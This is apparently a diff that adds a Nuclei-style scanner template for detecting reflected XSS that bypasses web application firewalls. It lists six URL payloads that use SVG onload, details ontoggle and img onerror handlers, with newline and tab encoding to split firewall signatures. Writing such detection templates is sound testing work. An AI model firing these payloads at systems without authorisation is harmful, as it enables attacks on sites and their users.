@@ -1,0 +1,42 @@
+id: xss-waf-bypass-svg-onload
+
+info:
+  name: XSS via SVG onload WAF Bypass
+  author: custom
+  severity: high
+  description: |
+    Tests reflected XSS using SVG tag with onload event handler. Many WAFs
+    block <script> but allow SVG elements. Variants include newline injection
+    between tag name and event handler to split the WAF signature.
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+  tags: xss,waf-bypass,svg
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<svg/onload=alert(document.domain)>"
+      - "{{BaseURL}}/?q=<svg%0Aonload%3Dalert(1)>"
+      - "{{BaseURL}}/?q=<svg%09onload%3Dalert(1)>"
+      - "{{BaseURL}}/?q=<svg+onload=confirm(1)>"
+      - "{{BaseURL}}/?q=<details/open/ontoggle=alert(1)>"
+      - "{{BaseURL}}/?q=<img/src/onerror=alert(1)>"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<svg/onload=alert("
+          - "<svg onload=alert("
+          - "<details/open/ontoggle=alert("
+          - "<img/src/onerror=alert("
+          - "onerror=alert(1)"
+          - "onload=alert(1)"
+        condition: or
